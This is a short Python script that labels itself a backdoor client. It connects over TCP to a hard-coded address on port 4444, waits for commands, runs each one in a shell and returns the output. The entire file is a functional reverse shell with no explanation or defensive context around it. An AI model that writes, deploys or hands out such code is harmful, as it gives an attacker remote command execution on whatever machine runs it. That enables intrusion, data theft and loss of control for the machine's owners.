
import socket # connect to server
import subprocess

server_host = "192.168.0.81" # 192.168.0.81
server_port = 4444

class BackdoorClient:
    def __init__(self, server_host, server_port, buffer_size=1024):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((server_host, server_port))
        self.server_host = server_host
        self.server_port = server_port
        self.buffer_size = buffer_size
        print(f"Connected to {self.server_host}:{self.server_port}")
    
    def execute_order(self, command):
        return subprocess.check_output(command, shell=True)
    
    def run(self):
        while True:
            command = self.receive_command()
            command_output = self.execute_order(command)
            self.send_output(command_output)
        
    def receive_command(self):
        return self.connection.recv(self.buffer_size).decode()

    def send_output(self, output):
        self.connection.send(output)

# Creating and running the client
client = BackdoorClient(server_host, server_port)
client.run()
